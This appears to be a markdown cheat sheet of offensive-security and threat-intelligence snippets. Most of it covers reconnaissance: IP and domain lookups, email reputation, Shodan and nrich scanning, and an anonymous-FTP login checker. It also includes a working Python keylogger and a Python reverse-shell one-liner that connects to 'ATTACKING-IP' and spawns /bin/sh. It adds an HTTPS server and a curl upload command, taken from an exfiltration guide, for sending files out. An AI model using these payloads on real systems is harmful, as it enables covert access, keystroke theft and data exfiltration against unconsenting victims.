# Threat Intelligence TTPs

## Query IP geolocation information with IP2Location.io

``` bash
curl -s "https://api.ip2location.io/?ip=8.8.8.8&format=json" | jq
```

```json
{
    "ip": "8.8.8.8",
    "country_code": "US",
    "country_name": "United States of America",
    "region_name": "California",
    "city_name": "Mountain View",
    "latitude": 37.38605,
    "longitude": -122.08385,
    "zip_code": "94035",
    "time_zone": "-07:00",
    "asn": "15169",
    "as": "Google LLC",
    "is_proxy": false,
    "message": "Limit to 500 queries per day. Sign up for a Free plan at https://www.ip2location.io to get 30K queries per month."
}
```

## Enumerating IPs with IPInfo

```curl ipinfo.io/54.90.107.240```

```json
{
  "ip": "54.90.107.240",
  "hostname": "ec2-54-90-107-240.compute-1.amazonaws.com",
  "city": "Virginia Beach",
  "region": "Virginia",
  "country": "US",
  "loc": "36.8512,-76.1692",
  "org": "AS14618 Amazon.com, Inc.",
  "postal": "23465",
  "readme": "https://ipinfo.io/missingauth"
}
```

You can also utilize https://cybergordon.com/ to check for IP reputation!

## Enumerating Domains with RDAP

The Registration Data Access Protocol (RDAP) is the definitive source for delivering generic top-level domain name (gTLD) registration information in place of sunsetted WHOIS services. The `rdap` command is a full-featured, command-line interface (CLI) client for RDAP. It supports RDAP bootstrapping, caching, different output formats, and many more features.

![rdap](https://github.com/user-attachments/assets/e744a79f-75b0-4e40-a3b1-29fe1cd94455)

### Basic Queries

```sh
# Domain
rdap example.com

# TLD
rdap .com

# IP Address
rdap 192.0.2.1

# CIDR
rdap 10/8

# ASN
rdap as64496

# URL
rdap https://rdap.iana.org/domain/com
```

## Email Recon

```curl emailrep.io/john.smith@gmail.com```

```json
{
  "email": "john.smith@gmail.com",
  "reputation": "high",
  "suspicious": false,
  "references": 91,
  "details": {
    "blacklisted": false,
    "malicious_activity": false,
    "malicious_activity_recent": false,
    "credentials_leaked": true,
    "credentials_leaked_recent": false,
    "data_breach": true,
    "last_seen": "07/27/2019",
    "domain_exists": true,
    "domain_reputation": "n/a",
    "new_domain": false,
    "days_since_domain_creation": 8773,
    "suspicious_tld": false,
    "spam": false,
    "free_provider": true,
    "disposable": false,
    "deliverable": true,
    "accept_all": false,
    "valid_mx": true,
    "spoofable": true,
    "spf_strict": true,
    "dmarc_enforced": false,
    "profiles": [
      "lastfm",
      "pinterest",
      "foursquare",
      "aboutme",
      "spotify",
      "twitter",
      "vimeo"
    ]
  }
}
```

## nrich IP Enumeration

A command-line tool to quickly analyze all IPs in a file and see which ones have open ports/ vulnerabilities. Can also be fed data from stdin to be used in a data pipeline.

### Install

```bash
$ wget https://gitlab.com/api/v4/projects/33695681/packages/generic/nrich/latest/nrich_latest_amd64.deb
$ sudo dpkg -i nrich_latest_amd64.deb
```

### Confirmation

```sh
$ echo 149.202.182.140 | nrich -
149.202.182.140 (ftptech1.pcsoft.fr)
  Ports: 21, 80, 111, 443
  CPEs: cpe:/a:proftpd:proftpd:1.3.5b, cpe:/a:apache:http_server:2.4.25
  Vulnerabilities: CVE-2018-11763, CVE-2019-0220, CVE-2017-15710, CVE-2018-1312, CVE-2019-0197, CVE-2017-9798, CVE-2018-1283, CVE-2017-7668, CVE-2017-3169, CVE-2017-15715, CVE-2017-7659, CVE-2018-1333, CVE-2019-0211, CVE-2019-12815, CVE-2017-3167, CVE-2017-9788, CVE-2019-0196, CVE-2017-7679, CVE-2018-17199
```

### Usage

```sh
$ nrich --help
nrich 0.1.0
Add network information to IPs

USAGE:
    nrich [OPTIONS] <filename>

FLAGS:
    -h, --help       Prints help information
    -V, --version    Prints version information

OPTIONS:
    -o, --output <output>    Output format (shell or json) [default: shell]

ARGS:
    <filename>    File containing an IP per line. Non-IPs are ignored
```

## Extracting PDF Text with Python Image OCR

```python
#!/usr/bin/env python3

from PIL import Image
import pyTesseract
import numpy as np

# Simple PDF Image OCR Extractor

file = '/home/rosesecurity/Desktop/Target_OrgChart.pdf'
pdf_img = np.array(Image.open(file))
text = pyTesseract.image_to_string(pdf_img)
```

## Threat Intelligence Streams with Python and Reddit

Enumerate new Reddit comments for threat intelligence. This script can be modified with regular expressions to hone in on exploit development, modern threats, and any newsworthy cyber events. 

```python
#!/usr/bin/env python3

import praw

reddit = praw.Reddit(client_id ='xxxxxxxxxxxxxxx', 
                     client_secret ='xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', 
                     user_agent ='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 
                     username ='username', 
                     password ='pass') 


for comment in reddit.subreddit('hacking+infosec+redteamsec+cybersecurity+netsec+hackernews+malware+blueteamsec').stream.comments():
    print(comment.body)
```

## Python HTTPS Server

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
```

Source: ```https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration```

## Enumerating Anonymous FTP Logins Using Python

```python
#!/usr/bin/python3

from ftplib import FTP
import sys

ips = open(sys.argv[1], 'r')
r = ips.readlines()
for item in r:
    item = item.strip()
    print("[+] Connecting to: %s \n" %item)
    try:
        ftp = FTP(item, timeout=3) 
        ftp.login()
       
        if ftp.retrlines('LIST') != 0:
            print("[+] Anonymous login enabled on Host: %s \n" %item)
            print("="*70+"\n")
    except:
        print("[+] Unable to Connect to Host: %s\n" %item)
        print("="*70+"\n")
```

1. Usage : ```python3 FTPLoginChecker.py ip_addresses.txt```
2. Note : Use shodan_eye.py to search for FTP servers that have the ```anon``` login enabled.
3. Search Keyword : ```230 anonymous```

## Python Keylogger

```python
import pyHook, pythoncom, logging
logging.basicConfig(filename='mykeylogger.txt', level=logging.DEBUG, format='%(message)s')

def OnKeyboardEvent(event):
    logging.log(logging.DEBUG,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
```

Mailtrap.io implementation:

```python
from pynput import keyboard
from pynput.keyboard import Listener
...
keyboard_listener = keyboard.Listener(on_press=self.save_data)
with keyboard_listener:
    self.report()
    keyboard_listener.join()
```

## Python Reverse Shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Python Basic File Upload

```python
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

## Generating HoneyDocs with Python

Python's Faker module can be utilized to create honeydocs of PII with malicious macros, wordlists, emails for login brute-forcing, and much more.

```python
import pandas as pd
from faker import Faker

# Create a Faker object
fake = Faker()

# Options to data:
fake.name()
fake.text()
fake.address()
fake.email()
fake.date()
fake.country()
fake.phone_number()
fake.random_number(digits=5)

# Example DataFrame
faker_df = pd.DataFrame({'date':[fake.date() for i in range(10)],
                         'name':[fake.name() for i in range(10)],
                         'email':[fake.email() for i in range(10)],
                         'text':[fake.text() for i in range(10)]})
faker_df
```

## Shodan CLI

The `shodan` command-line interface (CLI) is packaged with the official Python library for Shodan, which means if you're running the latest version of the library you already have access to the CLI. To install the new tool simply execute:

```sh
easy_install shodan
```

Once the tool is installed you have to initialize the environment with your [API key](https://account.shodan.io/) using `shodan init`:

```sh
shodan init YOUR_API_KEY
```

### `count`

Returns the number of results for a search query:

```sh
shodan count microsoft iis 6.0
5310594
```

### `host`

See information about the host such as where it's located, what ports are open and which organization owns the IP:

```sh
shodan host 189.201.128.250
```

### `myip`

Returns your Internet-facing IP address:

```sh
shodan myip
199.30.49.210
```

### `search`

This command lets you search Shodan and view the results in a terminal-friendly way. By default it will display the IP, port, hostnames and data. You can use the `--fields` parameter to print whichever banner fields you're interested in:

```sh
shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0
```
